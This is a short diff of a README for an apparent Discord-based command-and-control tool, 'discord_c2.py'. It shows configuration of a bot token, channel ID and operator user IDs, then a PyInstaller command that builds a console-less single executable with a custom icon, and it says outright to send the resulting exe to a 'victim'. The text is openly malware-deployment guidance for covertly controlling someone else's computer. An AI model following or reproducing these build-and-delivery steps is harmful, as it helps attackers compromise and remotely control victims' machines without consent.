@@ -112,20 +112,20 @@ Check python:
 
  `pip install pyinstaller` Must be for making exe
 
-3- Command
-
-`pyinstaller --noconsole --onefile --icon=Icon1.ico discord_c2.py`
-
------------------------------After formed exe send it to victum---------------------------
-# CONFIG THESE IN discord_c2.py 
+# CONFIG THESE IN discord_c2.py
 
 BOT_TOKEN = "your_bot_token_here"          # Discord bot token
+
 CHANNEL_ID = 123456789012345678            # integer, channel ID where bot listens
+
 ALLOWED_USER_IDS = [987654321098765432]    # your Discord user ID(s)
 
 # COMPILE IT INTO AN EXE BY USING PYINSTALLER And send it to victim:
 
 Command = ` pyinstaller --noconsole --onefile --icon=Icon1.ico discord_c2.py `
+
+-----------------------------After formed exe send it to victum---------------------------
+
 
 
 **In your Discord channel:**
